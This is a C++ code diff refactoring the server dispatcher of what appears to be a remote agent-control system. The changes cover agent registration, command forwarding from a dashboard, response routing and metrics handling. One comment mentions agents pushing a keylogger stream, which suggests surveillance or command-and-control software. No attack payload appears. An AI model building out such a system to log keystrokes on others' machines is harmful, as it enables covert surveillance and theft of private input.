@@ -31,7 +31,7 @@ void ServerDispatcher::handleFrame(FrameTransport& agent, const Frame& frame) {
       onResponse(connection, frame.payload);
       break;
     case MessageType::DATA:
-      onData(frame.payload);
+      onData(connection, frame.payload);
       break;
     case MessageType::DISCONNECT:
       if (sessionManager_.isDashboardConnection(connection.getFd())) {
@@ -88,12 +88,13 @@ void ServerDispatcher::onRegister(AgentConnection& agent,
   RegisterPayload registerToSent;
   agentService_.registerAgent(agent, agentInfo, registerToSent);
 
-  DataPayload registration;
-  registration.subtype = DataType::REGISTRATION;
-  registration.data =
+  DashboardData registration;
+  registration.target = agent.getId();
+  registration.data.subtype = DataType::REGISTRATION;
+  registration.data.data =
       ProtocolSerializer::serializeRegisterPayload(registerToSent);
   std::vector<std::uint8_t> registerPayload =
-      ProtocolSerializer::serializeDataPayload(registration);
+      ProtocolSerializer::serializeDashboardData(registration);
   Frame frame{ProtocolHelper::createHeader(MessageType::DATA, registerPayload),
               registerPayload};
 
@@ -112,14 +113,15 @@ void ServerDispatcher::onDashboardRegister(
     AgentConnection& dashboard, const std::vector<std::uint8_t>& payload) {
   agentService_.registerDashboard(dashboard,
                                   ProtocolParser::parseOsInfoPayload(payload));
-  DataPayload data;
-  data.subtype = DataType::AGENTS;
+  DashboardData data;
+  data.target = "";
+  data.data.subtype = DataType::AGENTS;
 
-  data.data = ProtocolSerializer::serializeRegisterPayloadList(
+  data.data.data = ProtocolSerializer::serializeRegisterPayloadList(
       agentService_.getAllAgents(dashboard));
 
   std::vector<std::uint8_t> finalPayload =
-      ProtocolSerializer::serializeDataPayload(data);
+      ProtocolSerializer::serializeDashboardData(data);
 
   Frame frame{ProtocolHelper::createHeader(MessageType::DATA, finalPayload),
               finalPayload};
@@ -137,9 +139,19 @@ void ServerDispatcher::onResponse(AgentConnection& agent,
   const ResponsePayload response =
       ProtocolParser::parseResponsePayload(payload);
 
+  // responseService_.save() resolves the target via the command id,
+  // persists the response to the DB, and (on the last chunk) cleans up
+  // the command->target mapping. An unknown/expired command id throws.
   DashboardResponse dashResponse;
-  dashResponse.target = commandService_.getTarget(response.id);
-  dashResponse.response = response;
+
+  try {
+    dashResponse = responseService_.save(response);
+  } catch (const std::exception& e) {
+    Logger::error("server dispatcher", "Failed to save/route response id=" +
+                                           std::to_string(response.id) + ": " +
+                                           e.what());
+    return;
+  }
 
   std::vector<std::uint8_t> dashPayload =
       ProtocolSerializer::serializeDashboardResponse(dashResponse);
@@ -151,59 +163,45 @@ void ServerDispatcher::onResponse(AgentConnection& agent,
     sessionManager_.getDashboard().sendFrame(frame);
   }
 
-  // Clean up when last chunk received
-  if (response.chunk_index + 1 == response.total_chunks) {
-    // commandTargets_.erase(commandId);
-    commandService_.deleteTarget(response.id);
-  }
+  // BEFORE response_service.cpp was added, the dispatcher did the following:
+  // dashResponse.target = commandService_.getTarget(response.id);
+  // dashResponse.response = response;
+
+  // std::vector<std::uint8_t> dashPayload =
+  //     ProtocolSerializer::serializeDashboardResponse(dashResponse);
+  // Frame frame = {
+  //     ProtocolHelper::createHeader(MessageType::RESPONSE, dashPayload),
+  //     dashPayload};
+
+  // if (sessionManager_.isDashboard()) {
+  //   sessionManager_.getDashboard().sendFrame(frame);
+  // }
+
+  // // Clean up when last chunk received
+  // if (response.chunk_index + 1 == response.total_chunks) {
+  //   // commandTargets_.erase(commandId);
+  //   commandService_.deleteTarget(response.id);
+  // }
 }
 
 // DATA messages are pushed by the agent without a prior COMMAND
 // (e.g. keylogger stream). Handle them independently of the
 // request/response cycle.
-void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
+void ServerDispatcher::onData(AgentConnection& agent,
+                              const std::vector<std::uint8_t>& payload) {
   const DataPayload data = ProtocolParser::parseDataPayload(payload);
   std::ostringstream what;
   what << "[DATA] subtype=" << static_cast<int>(data.subtype) << "\n";
   Frame frame;
-  int dashboardFd;
-
-  if (sessionManager_.isDashboard()) {
-    dashboardFd = sessionManager_.getDashboardFd();
-    // frame.payload = payload;
-    // sessionManager_.getDashboard().sendFrame(frame);
-  }
 
   switch (data.subtype) {
     case DataType::METRICS_SAMPLE: {
-      frame.header = ProtocolHelper::createHeader(MessageType::DATA, payload);
-      frame.payload = payload;
-      sessionManager_.getAgent(dashboardFd).sendFrame(frame);
-      // TODO For log only, doesn't need to parse it once dashboard will
-      // retrieve it
-      {
-        MetricsSample sample = MetricsParser::parseMetricsSample(data.data);
-
-        what << "[DATA] METRICS_SAMPLE\n";
-
-        what << "CPU: " << sample.cpu.total_percent << "%\n";
-        what << "CPU cores: ";
-        for (float core : sample.cpu.per_core) what << core << "% ";
-        what << '\n';
-
-        what << "Memory: " << sample.mem.phys_used << "/"
-             << sample.mem.phys_total << " bytes used\n";
-
-        for (const auto& disk : sample.disks) {
-          what << "Disk " << disk.device << " R=" << disk.read_bytes_per_sec
-               << " W=" << disk.write_bytes_per_sec << '\n';
-        }
-
-        for (const auto& iface : sample.interfaces) {
-          what << "Net " << iface.iface << " RX=" << iface.rx_bytes_per_sec
-               << " TX=" << iface.tx_bytes_per_sec << '\n';
-        }
+      MetricsSample sample = MetricsParser::parseMetricsSample(data.data);
+      frame = metricsService_.save(agent.getId(), sample);
+      if (sessionManager_.isDashboard()) {
+        sessionManager_.getDashboard().sendFrame(frame);
       }
+      // todo use metrics service
     } break;
     case DataType::HEALTH_CHECK: {
       what << "health check not implemented yet";
@@ -226,10 +224,6 @@ void ServerDispatcher::onData(const std::vector<std::uint8_t>& payload) {
     }
   }
 
-  if (sessionManager_.isDashboard()) {
-    frame.payload = payload;
-    sessionManager_.getDashboard().sendFrame(frame);
-  }
   Logger::info("server dispatcher", what.str());
 }
 
@@ -243,7 +237,7 @@ void ServerDispatcher::onDashboardCommand(
         sessionManager_.getAgentByTarget(commandDashboard.target);
     commandService_.save(commandDashboard);
     sendCommand(agent, commandDashboard.command);
-    
+
   } catch (const std::exception& e) {
     dashboard.sendError(ErrorType::UNKNOWN_COMMAND,
                         "Agent target not found: " + commandDashboard.target);
@@ -306,7 +300,6 @@ void ServerDispatcher::sendDisconnect(AgentConnection& agent) {
   agent.sendFrame(frame);
   Logger::info("server dispatcher", "[DISCONNECT]");
 }
-
 
 // TODO DASHBOARD SHOULD GET THESE
 
